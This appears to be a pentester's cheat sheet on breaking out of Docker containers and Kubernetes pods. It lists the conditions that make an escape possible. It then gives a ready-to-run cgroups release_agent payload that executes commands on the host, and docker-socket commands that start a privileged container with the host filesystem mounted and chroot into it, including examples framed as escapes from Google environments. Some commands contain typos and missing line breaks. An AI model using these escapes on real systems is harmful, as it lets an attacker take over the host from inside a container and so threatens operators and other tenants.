# Escaping docker

## Quick summary

Docker runs with root rights. Even when it's running within the docker group. The docker communicates with the containers through a unix socket.



Docker in docker is fairly common. To do this the host's docker socket has to be mounted in the docker container (there are other ways, but this is the most common one).  Used in e.g. Portainer.



The `--privileged` flag exploit relies on relaunching a docker container with this flag. When using this flag, containers have full access to all devices and lack restrictions from sccomp, AppArmor and Linux capabilities

But the `--privileged` flag is overkill, the only needed requirements are:

- Have root in container

- Container must be run with the `SYS_ADMIN`  Linux capability

- Container  must lack AppArmor profile, or otherwise allow the `mount` syscall

- The cgroup v1 virtual filesystem mst be mounted read-write inside the container

By default, docker starts with restricted set of capabilities (doesnt include SYS_ADMIN), and default AppArmor profile is `docker-default`, which prevents the mount syscall.

Default unix socket:

    /var/run/docker.sock



## Quick and dirty way to get out of a privileged k8s pod or docker container

Using cgroups release_agent feature:

```bash
docker run -it --privileged busybox /bin/sh / # echo {payload} | base64 -d > undock.sh
```

Where payload is the following text, base64 encoded:

```bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```



## Example escape from google k8s

The host is mounted in the container at /host/google/docker/run

```bash
sudo docker -H unix://<docker socket> pull alpine:latest
sudo docker -H unix://<docker socket> run \
    -d \
    -it \
    --name <containername> \
    -v "/proc:/host/proc" \
    -v "/sys:/host/sys" \
    -v "/:/rootfs" \
    --network=host \
    --privileged=true
    --cap-add=ALL
    alpine:latest
sudo docker -H unix://<socket socket> start <containername>
sudo docker -H unix://<socker socket> exec -it <containername> /bin/sh
chroot /rootfs
# You are now in a container with a lot more privileges
docker ps #(will list all docker containers on host)

```



Example - escape docker cloud shell to host OS

```bash
sudodocker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host/bin/bash
```



Sources:

- https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

- 
